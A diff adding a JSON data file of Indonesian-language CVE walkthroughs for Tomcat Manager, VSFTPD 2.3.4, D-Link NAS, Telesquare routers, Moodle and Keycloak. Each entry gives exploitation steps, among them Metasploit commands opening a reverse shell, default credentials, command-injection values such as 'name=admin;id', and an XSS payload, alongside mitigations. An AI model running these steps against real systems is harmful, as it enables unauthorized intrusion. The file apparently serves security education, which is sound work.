@@ -1,0 +1,132 @@
+[
+    {
+      "id": 6,
+      "cve-id": "CVE-2009-3548",
+      "severity": "high",
+      "vector": "(AV:N/AC:L/Au:N/C:P/I:P/A:P)",
+      "basescore": "7.5",
+      "nvdpublishdate": "11/12/2009",
+      "mitresource": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3548",
+      "nvdnistsource": "https://nvd.nist.gov/vuln/detail/CVE-2009-3548",
+      "title": "Apache Tomcat Manager Authenticated WAR Upload Remote Code Execution",
+      "content": "<h2>Deskripsi</h2>CVE-2009-3548 adalah kerentanan pada <b>Apache Tomcat Manager</b> yang memungkinkan pengguna dengan kredensial sah (authenticated) mengunggah aplikasi <b>WAR file</b> berisi payload berbahaya. Setelah di-deploy, WAR tersebut dieksekusi oleh Tomcat, sehingga penyerang memperoleh <b>Remote Code Execution (RCE)</b>. Celah ini terutama berdampak pada <i>Apache Tomcat 5.5.x</i> dan varian lain yang mengaktifkan manager webapp.",
+      "content2": "<h2>Identifikasi Target</h2>Periksa apakah aplikasi Tomcat Manager aktif di <u>http://target:8080/manager/html</u>. Jika login berhasil dengan kredensial default/lemah (misalnya <code>tomcat:tomcat</code>), endpoint <b>/manager/html/upload</b> dapat diakses untuk upload. Target yang rentan biasanya menunjukkan form upload aplikasi di antarmuka Manager.",
+      "content3": "<h2>Langkah-Langkah (msfconsole)</h2><br>1. Buka Metasploit: <code>msfconsole</code><br>2. Pilih modul: <code>use exploit/multi/http/tomcat_mgr_upload</code><br>3. Set target: <code>set RHOSTS &lt;IP_TARGET&gt;</code> dan <code>set RPORT 8080</code><br>4. Masukkan kredensial: <code>set HttpUsername tomcat</code> &amp; <code>set HttpPassword tomcat</code><br>5. Pilih payload: <code>set payload java/jsp_shell_reverse_tcp</code><br>6. Jalankan: <code>run</code><br>→ Modul akan mengunggah WAR berisi JSP shell, mendepoy-nya, lalu membuka <b>reverse shell</b> ke attacker.",
+      "content4": "<h2>Kesimpulan</h2>Celah ini mengizinkan penyerang dengan akses <b>manager</b> untuk mengunggah kode arbitrer yang segera dieksekusi server. Dampaknya setara <b>remote code execution</b> penuh dengan hak proses Tomcat (seringkali <i>tomcat</i> user). <b>Mitigasi:</b> nonaktifkan Tomcat Manager di server produksi, gunakan kredensial yang kuat, batasi akses hanya dari host tertentu, serta perbarui ke rilis Tomcat terbaru.",
+      "embed": "https://www.youtube.com/embed/MV5T_kAHE34?si=Gujvk7TZbU1ItGp0",
+      "date": "26/1/2025",
+      "postby": "SaklarRusak",
+      "profileLink": "/hunter/profile/?nick=SaklarRusak",
+      "detailPage": "/cve/A01/?id=6"
+    },
+
+    {
+      "id": 5,
+      "cve-id": "CVE-2011-2523",
+      "severity": "critical",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "basescore": "9.8",
+      "nvdpublishdate": "11/27/2019",
+      "mitresource": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523",
+      "nvdnistsource": "https://nvd.nist.gov/vuln/detail/CVE-2011-2523",
+      "title": "VSFTPD 2.3.4 Backdoor Remote Shell on TCP/6200",
+      "content": "<h2>Deskripsi</h2>CVE-2011-2523 adalah backdoor yang tertanam pada paket <b>VSFTPD 2.3.4</b> (arsip yang diunduh antara <i>2011-06-30</i> hingga <i>2011-07-03</i>). Saat dipicu, daemon membuka shell di <b>port 6200/tcp</b>, memungkinkan penyerang memperoleh akses shell jarak jauh tanpa autentikasi.",
+      "content2": "<h2>Identifikasi Target</h2>Pastikan server menjalankan VSFTPD 2.3.4 yang terkena backdoor (sering dijumpai pada image lab/CTF lawas seperti Metasploitable2). Indikasi kuat adalah layanan FTP aktif pada <u>21/tcp</u> dan, jika dieksploitasi, host akan mengekspose shell pada <u>6200/tcp</u>.",
+      "content3": "<h2>Langkah-Langkah (msfconsole)</h2><br>1. Buka Metasploit: <code>msfconsole</code><br>2. Pilih modul: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code><br>3. Set target: <code>set RHOSTS &lt;IP_TARGET&gt;</code> (opsional: <code>set RPORT 21</code>)<br>4. Jalankan: <code>run</code> → modul akan memicu backdoor (menggunakan pola username khusus) dan membuka <b>session shell</b> pada port 6200.<br>5. Verifikasi akses: di session, jalankan <code>id</code>, <code>uname -a</code> untuk konfirmasi.",
+      "content4": "<h2>Kesimpulan</h2>Celah ini adalah kasus supply-chain backdoor: versi biner yang teracuni membuka shell tanpa autentikasi pada 6200/tcp. Dampaknya setara <b>remote code execution</b> penuh. <b>Mitigasi:</b> gunakan rilis VSFTPD yang tepercaya/dipatch, verifikasi checksum/TTD rilis, segmentasi layanan FTP, dan blokir port 6200/tcp di perimeter.",
+      "embed": "https://www.youtube.com/embed/tJnNn03yvRs?rel=0&cc_load_policy=1",
+
+      "date": "26/1/2025",
+      "postby": "SaklarRusak",
+      "profileLink": "/hunter/profile/?nick=SaklarRusak",
+      "detailPage": "/cve/A01/?id=5"
+    },
+
+    {
+      "id": 4,
+      "cve-id": "CVE-2024-10914",
+      "severity": "critical",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "basescore": "9.8",
+      "nvdpublishdate": "11/06/2024",
+      "mitresource": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10914",
+      "nvdnistsource": "https://nvd.nist.gov/vuln/detail/CVE-2024-10914",
+      "title": "Command Injection in D-Link NAS account_mgr.cgi (cgi_user_add)",
+      "content": "<h2>Deskripsi</h2>CVE-2024-10914 adalah kerentanan <b>Command Injection</b> pada perangkat NAS <b>D-Link</b> (DNS-320, DNS-320LW, DNS-325, DNS-340L). Celah terjadi pada endpoint <code>/cgi-bin/account_mgr.cgi?cmd=cgi_user_add</code> di mana parameter <code>name</code> tidak disanitasi dengan benar, memungkinkan penyerang menyuntikkan dan mengeksekusi perintah sistem operasi dari jarak jauh (<b>unauthenticated RCE</b>) ketika antarmuka admin terekspos.",
+      "content2": "<h2>Identifikasi Target</h2>Pastikan target adalah salah satu model NAS D-Link yang terdampak dan antarmuka webnya aktif. Cek keberadaan path <u>/cgi-bin/account_mgr.cgi?cmd=cgi_user_add</u> pada panel administrasi; jika parameter <code>name</code> diproses/terpantul tanpa validasi ketat, perangkat kemungkinan rentan (sering ditemukan pada unit yang sudah mencapai EoL dan tidak lagi menerima patch).",
+      "content3": "<h2>Langkah-Langkah</h2><br> 1. Tangkap request ke <u>/cgi-bin/account_mgr.cgi?cmd=cgi_user_add</u> menggunakan <b>Burp Suite</b> (Proxy → Intercept).<br> 2. Kirim ke <b>Repeater</b> dan uji parameter <code>name</code> dengan payload PoC non-destruktif (mis. <code>id</code>, <code>uname -a</code>).<br> 3. Sisipkan pemisah perintah (mis. <code>;</code>, <code>&&</code>, <code>||</code>) contoh: <code>name=admin;id</code> lalu kirim.<br> 4. Jika respons mengandung keluaran perintah (UID/kernel), injeksi berhasil → indikasi <b>RCE</b>.<br> 5. Etika: batasi pada PoC aman; jangan ubah konfigurasi/menjalankan perintah merusak.",
+      "content4": "<h2>Kesimpulan</h2>Kerentanan memanfaatkan kurangnya sanitasi pada parameter <code>name</code> sehingga input diperlakukan sebagai perintah OS. Dampak mencakup pengambilalihan perangkat, akses data, dan pivoting ke jaringan internal. <b>Mitigasi:</b> karena banyak model sudah <i>end-of-life</i> dan tidak akan diperbaiki, isolasikan dari internet, batasi akses (VPN/ACL), matikan layanan yang tidak perlu, segmentasi jaringan, serta rencanakan penggantian perangkat.",
+      "embed": "https://www.youtube.com/embed/rm8ETJJiDXo?si=-Fzow7WRkB4_Nz4r",
+            
+      "date": "26/1/2025",
+      "postby": "Wsluser",
+      "profileLink": "/hunter/profile/?nick=Wsluser",
+      "detailPage": "/cve/A01/?id=4"
+    },
+
+    {
+      "id": 3,
+      "cve-id": "CVE-2024-29269",
+      "severity": "high",
+      "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "basescore": "8.8",
+      "nvdpublishdate": "04/10/2024",
+      "mitresource": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29269",
+      "nvdnistsource": "https://nvd.nist.gov/vuln/detail/CVE-2024-29269",
+      "title": "Remote Command Execution on TLR-2005KSH Routers",
+      "content": "<h2>Deskripsi</h2>CVE-2024-29269 adalah kerentanan <b>Command Injection</b> pada router <b>Telesquare TLR-2005Ksh</b> (firmware 1.0.0 dan 1.1.4). Celah terjadi karena input pada parameter <code>Cmd</code> tidak disanitasi sehingga penyerang dapat menyisipkan perintah sistem operasi. Akibatnya, penyerang dapat mengeksekusi perintah arbitrer (RCE) pada perangkat dan berpotensi mengambil alih router beserta jaringan di belakangnya.",
+      "content2": "<h2>Identifikasi Target</h2>Pastikan target adalah perangkat Telesquare TLR-2005Ksh (mis. dari banner web UI/halaman login). Periksa adanya endpoint/fitur diagnostik yang menerima parameter <code>Cmd</code> (umumnya di antarmuka administrasi/diagnostik). Jika nilai <code>Cmd</code> dipantulkan atau diproses tanpa validasi yang ketat, perangkat kemungkinan rentan.",
+      "content3": "<h2>Langkah-Langkah</h2><br> 1. Tangkap request ke fitur diagnostik/CLI pada web UI menggunakan <b>Burp Suite</b> (Proxy → Intercept).<br> 2. Kirim ke <b>Repeater</b> dan uji parameter <code>Cmd</code> dengan payload aman (mis. <code>id</code>, <code>whoami</code>).<br> 3. Coba karakter pemisah perintah (mis. <code>;&amp;&amp;||</code>) untuk menguji injeksi, contoh: <code>Cmd=id;uname -a</code>.<br> 4. Jika respons menampilkan keluaran perintah (UID/kernel), berarti injeksi berhasil → berpotensi <b>unauthenticated RCE</b>.<br> 5. <b>Etika & keamanan:</b> batasi pada PoC non-destruktif, jangan mengubah konfigurasi/menjalankan perintah merusak.",
+      "content4": "<h2>Kesimpulan</h2>Kerentanan ini memanfaatkan kurangnya sanitasi pada parameter <code>Cmd</code> sehingga input pengguna dieksekusi sebagai perintah OS. Dampaknya serius: pengambilalihan perangkat, pengintaian jaringan, hingga pivoting. <b>Mitigasi:</b> perbarui firmware jika tersedia, batasi akses admin UI (VPN/ACL), nonaktifkan fitur diagnostik yang tidak perlu, terapkan penyaringan input di sisi server, dan segmentasi jaringan untuk membatasi dampak kompromi.",
+      "embed": "https://www.youtube.com/embed/KXRhwmz5Eb8?si=EVCZosvWeuH3bLA3",
+        
+      "date": "26/1/2025",
+      "postby": "Wsluser",
+      "profileLink": "/hunter/profile/?nick=Wsluser",
+      "detailPage": "/cve/A01/?id=3"
+    },
+
+    {
+      "id": 2,
+      "cve-id": "CVE-2022-35653",
+      "severity": "medium",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+      "basescore": "6.1",
+      "nvdpublishdate": "07/25/2022",
+      "mitresource": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2022-35653",
+      "nvdnistsource": "https://nvd.nist.gov/vuln/detail/cve-2022-35653",
+      "title": "reflected XSS issue was identified in the LTI module of Moodle",
+      "content": "<h2>Deskripsi</h2>CVE-2022-35653 adalah kerentanan Cross-Site Scripting (XSS) yang ditemukan pada Moodle, khususnya pada modul <b>LTI (Learning Tools Interoperability)</b>. Celah ini terjadi karena kurangnya penyaringan input pengguna yang dikirimkan ke modul tersebut. Penyerang dapat menyisipkan JavaScript berbahaya yang akan segera dieksekusi di browser korban. Kerentanan ini termasuk kategori <b>Reflected XSS</b>, sehingga skrip dieksekusi secara langsung ketika korban membuka URL atau halaman yang sudah dimanipulasi.",
+      "content2": "<h2>Identifikasi Target</h2>Untuk mengidentifikasi target, periksa apakah situs menggunakan Moodle dengan modul LTI aktif. Biasanya dapat dikenali dari path <u>/mod/lti/auth.php</u>. Dengan mengirimkan input khusus atau payload ke endpoint ini, aplikasi akan memantulkan kembali data tersebut di respon halaman tanpa validasi, yang menjadi pintu masuk eksploitasi Reflected XSS.",
+      "content3": "<h2>Langkah-Langkah</h2><br> 1. Aktifkan intercept di <b>Burp Suite</b> dan akses URL: <u>/mod/lti/auth.php</u>.<br> 2. Ubah metode request <b>GET → POST</b>.<br> 3. Tambahkan payload JavaScript di parameter/body, misalnya: <code>&lt;img src=x onerror=alert('XSS_POC')&gt;</code>.<br> 4. Kirim <b>request → buka halaman target → jika muncul popup alert/confirm(), maka XSS berhasil dieksploitasi.</b>",
+      "content4": "<h2>Kesimpulan</h2><br>Kerentanan ini termasuk <b>Reflected XSS</b> pada modul <b>LTI Moodle</b> yang disebabkan oleh kurangnya sanitasi input. Dengan memanfaatkan celah ini, penyerang dapat menyuntikkan kode berbahaya ke dalam parameter request. Ketika korban membuka halaman tersebut, JavaScript berbahaya langsung dieksekusi di browser, sehingga memungkinkan pencurian cookie, manipulasi sesi, hingga aksi berbahaya lainnya.",
+      "embed": "https://www.youtube.com/embed/sFdW65LZe0g?si=YvkAX2ZXnLUJAObv",
+        
+      "date": "26/1/2025",
+      "postby": "SaklarRusak",
+      "profileLink": "/hunter/profile/?nick=SaklarRusak",
+      "detailPage": "/cve/A01/?id=3"
+    },
+
+    {
+      "id": 1,
+      "cve-id": "CVE-2021-20323",
+      "severity": "medium",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+      "basescore": "6.1",
+      "nvdpublishdate": "03/25/2022",
+      "mitresource": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-20323",
+      "nvdnistsource": "https://nvd.nist.gov/vuln/detail/cve-2021-20323",
+      "title": "Reflected XSS via Keycloak",
+      "content": "<h2> Deskripsi</h2>CVE-2021-20323 adalah kerentanan Cross-Site Scripting (XSS) yang ditemukan pada Keycloak (Identity and Access Management dari Red Hat). Celah ini terjadi karena kurangnya validasi input pada endpoint clients-registrations. Penyerang dapat menyisipkan JavaScript berbahaya yang akan dieksekusi di browser korban. Kerentanan ini terutama berbahaya bila dijalankan pada akun administrator atau pengguna dengan hak akses tinggi, karena dapat mencuri session cookie, token, atau melakukan aksi tanpa sepengetahuan korban.",
+      "content2": "<h2>Identifikasi Target</h2>memastikan target benar-benar menggunakan Keycloak. Biasanya dapat dikenali dari struktur URL atau halaman login default Keycloak. Salah satu indikasi ialah saat mengakses path <u>/auth/realms/master/clients-registrations/default</u>, server akan merespon dengan error 500 Internal Server Error. Respon ini menunjukkan endpoint tersedia, namun tidak divalidasi dengan baik, sehingga menjadi pintu masuk eksploitasi XSS.",
+      "content3": "<h2>Langkah-Langkah</h2><br> 1. Kirim ke Repeater, ubah metode <b>GET → POST</b>.<br> 2. Tambahkan header: <b>Content-Type: application/json</b> <br> 3. Isi body dengan payload: <a href='https://tsecnetwork.my.id/cve/txt/CVE-2021-20323.txt'>click to body request </a> <br> 4. Kirim <b>request → buka halaman target → akan muncul popup confirm() → bukti XSS berhasil.</b>",
+      "content4": "<h2>Kesimpulan</h2><br>kerentanan Stored XSS pada Keycloak yang terjadi karena endpoint <b> clients-registrations</b> tidak menyaring atau memvalidasi input JSON dengan benar, sehingga penyerang bisa menyisipkan kode berbahaya (misalnya tag <b> img onerror=...</b>) ke dalam request; input ini kemudian disimpan dan ditampilkan kembali di antarmuka web tanpa sanitasi, sehingga saat halaman dibuka, JavaScript berbahaya tersebut dieksekusi di browser korban.",
+      "embed": "https://www.youtube.com/embed/m4Ob67ryYsg?si=rreQWJwepqTidCEF",
+    
+      "date": "26/1/2025",
+      "postby": "SaklarRusak",
+      "profileLink": "/hunter/profile/?nick=SaklarRusak",
+      "detailPage": "/cve/A01/?id=1"
+    }
+]
